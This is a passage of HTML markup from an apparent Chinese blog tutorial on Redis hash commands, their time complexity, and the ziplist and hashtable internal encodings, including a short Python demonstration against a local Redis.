id=\"crayon-5bab6ad089231514296441-1\"><span class=\"crayon-e\">hmget </span><span class=\"crayon-e\">key </span><span class=\"crayon-i\">field</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">field</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089231514296441-2\"><span class=\"crayon-e\">hmset </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">field </span><span class=\"crayon-i\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">field </span><span class=\"crayon-i\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/6b2bd72c1d5fc9957882bff658adb945.png\" width=\"614\" height=\"196\"></p>\n<p>hmset 命令和 hmget 命令分别是批量设置和获取值的，hmset 命令没有什么要注意的，但 hmget 命令要特别注意，当我们获取一个不存在的 key 或者不存在的 field 时，Redis 并不会报错，而是返回 nil。并且有几个 field 不存在，则 Redis 返回几个 nil。</p>\n<p> </p>\n<h3>6.判断 field 是否存在</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089235383487538\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhexists key field</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089235383487538-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089235383487538-1\"><span class=\"crayon-e\">hexists </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">field</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/e998c7b3120835cb0e905597b51747d6.png\" width=\"405\" height=\"90\"></p>\n<p>当执行 hexists 命令时，如果当前 key 包括 field，则返回 1，否则返回 0。</p>\n<p> </p>\n<h3>7.获取所有 field</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089238815750471\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhkeys key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089238815750471-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089238815750471-1\"><span class=\"crayon-e\">hkeys </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/86e898df8ee96ab3d1574cb525349801.png\" width=\"422\" height=\"88\"></p>\n<p> </p>\n<h3>8.获取所有 value</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08923b109763904\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhvals key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08923b109763904-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08923b109763904-1\"><span class=\"crayon-e\">hvals </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/c5e83ffb90818103ebb7f3c2a782bed3.png\" width=\"282\" height=\"62\"></p>\n<p> </p>\n<h3>9.获取所有的 field-value</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08923e023605476\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhgetall key</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08923e023605476-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08923e023605476-1\"><span class=\"crayon-e\">hgetall </span><span class=\"crayon-v\">key</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/5ddfbe4cfc5d21a7dcc9d96c2429f04d.png\" width=\"298\" height=\"108\"></p>\n<p>hgetall 命令会返回当前 key 中的所有 field-value，并按照顺序依次返回。</p>\n<p> </p>\n<h3>10.计数</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089241556129950\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhincrby key field increment\r\nhincrbyfloat key field increment</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089241556129950-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad089241556129950-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089241556129950-1\"><span class=\"crayon-e\">hincrby </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">field </span><span class=\"crayon-e\">increment</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad089241556129950-2\"><span class=\"crayon-e\">hincrbyfloat </span><span class=\"crayon-e\">key </span><span class=\"crayon-e\">field </span><span class=\"crayon-v\">increment</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/579256da88aad082ee7c90bc0319ce65.png\" width=\"336\" height=\"103\"></p>\n<p>hincrby 命令和 incrby 命令的使用功能基本一样，都是对值进行增量操作的，唯一不同的就是 incrby 命令的作用域是 key，而 hincrby 命令的作用域则是 field。</p>\n<p> </p>\n<h3>11.计算 value 的字符串长度</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad089245870716235\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhstrlen key field</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad089245870716235-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad089245870716235-1\"><span class=\"crayon-e\">hstrlen </span><span class=\"crayon-e\">key </span><span class=\"crayon-v\">field</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/750a2a6eaf7f9a171b253aa6d1188e0e.png\" width=\"385\" height=\"129\"></p>\n<p>hstrlen 命令返回的是当前 key 中 field 中字符串的长度，如果当前 key 中没有 field 则返回 0。</p>\n<p> </p>\n<h2>时间复杂度</h2>\n<table cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>命令</td>\n<td>时间复杂度</td>\n</tr>\n<tr>\n<td>hset key field value</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>hget key field</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>hdel key field [field …]</td>\n<td>O(k) ，k是field个数</td>\n</tr>\n<tr>\n<td>hlen key</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>hgetall key</td>\n<td>O(n) ，n是field总数</td>\n</tr>\n<tr>\n<td>hmget key field [field …]</td>\n<td>O(k) ，k是field个数</td>\n</tr>\n<tr>\n<td>hmset key field value [field value …]</td>\n<td>O(k) ，k是field个数</td>\n</tr>\n<tr>\n<td>hexists key field</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>hkeys key</td>\n<td>O(n) ，n是field总数</td>\n</tr>\n<tr>\n<td>hvals key</td>\n<td>O(n) ，n是field总数</td>\n</tr>\n<tr>\n<td>hsetnx key field value</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>hincrby key field increment</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>hincrbyfloat key field increment</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>hstrlen key field</td>\n<td>O(1)</td>\n</tr>\n</tbody>\n</table>\n<p> </p>\n<h2>内部编码</h2>\n<p>Redis 哈希类型的内部编码有两种，它们分别是：</p>\n<ul>\n<li>ziplist（压缩列表）：当哈希类型中元素个数小于 hash-max-ziplist-entries 配置（默认 512 个），同时所有值都小于 hash-max-ziplist-value 配置（默认 64 字节）时，Redis 会使用 ziplist 作为哈希的内部实现。</li>\n<li>hashtable（哈希表）：当上述条件不满足时，Redis 则会采用 hashtable 作为哈希的内部实现。</li>\n</ul>\n<p>下面我们通过以下命令来演示一下 ziplist 和 hashtable 这两种内部编码。</p>\n<p>当 field 个数比较少并且 value 也不是很大时候 Redis 哈希类型的内部编码为 ziplist：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/608a30a65a2e98cb35c80f2530523cc6.png\" width=\"621\" height=\"89\"></p>\n<p>当 value 中的字节数大于 64 字节时（可以通过 hash-max-ziplist-value 设置），内部编码会由 ziplist 变成 hashtable。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/3bac38d4d600822b321bc70d038ffaa2.png\" width=\"763\" height=\"42\"></p>\n<p>当 field 个数超过 512（可以通过 hash-max-ziplist-entries 参数设置），内部编码也会由 ziplist 变成 hashtable。</p>\n<p>由于直接手动创建 512 个 field 不方便，为了更好的验证该功能，我将用程序的方式，动态创建 512 个 field 来验证此功能，下面为具体的代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6ad08924a908231365\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nimport redis\r\nr = redis.Redis(host='127.0.0.1', port=6379)\r\nprint('Key为【userinfo】的字节编码为【%s】' % r.object('encoding', 'userinfo').decode('utf-8'))\r\nfor i in range(1,513):    \r\n    r.hset('userinfo', i, '吉林乌拉')\r\nprint('Key为【userinfo】的字节编码为【%s】' % r.object('encoding', 'userinfo').decode('utf-8'))\r\nKey为【userinfo】的字节编码为【ziplist】\r\nKey为【userinfo】的字节编码为【hashtable】</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08924a908231365-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad08924a908231365-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08924a908231365-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad08924a908231365-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08924a908231365-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad08924a908231365-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6ad08924a908231365-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6ad08924a908231365-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6ad08924a908231365-1\"><span class=\"crayon-e\">import </span><span class=\"crayon-i\">redis</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad08924a908231365-2\"><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Redis</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">host</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'127.0.0.1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">port</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad08924a908231365-3\"><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Key为【userinfo】的字节编码为【%s】'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'encoding'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'userinfo'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">decode</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'utf-8'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad08924a908231365-4\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">513</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">    </span></div><div class=\"crayon-line\" id=\"crayon-5bab6ad08924a908231365-5\">    <span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'userinfo'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'吉林乌拉'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6ad08924a908231365-6\"><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'Key为【userinfo】的字节编码为【%s】'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">object</span><span 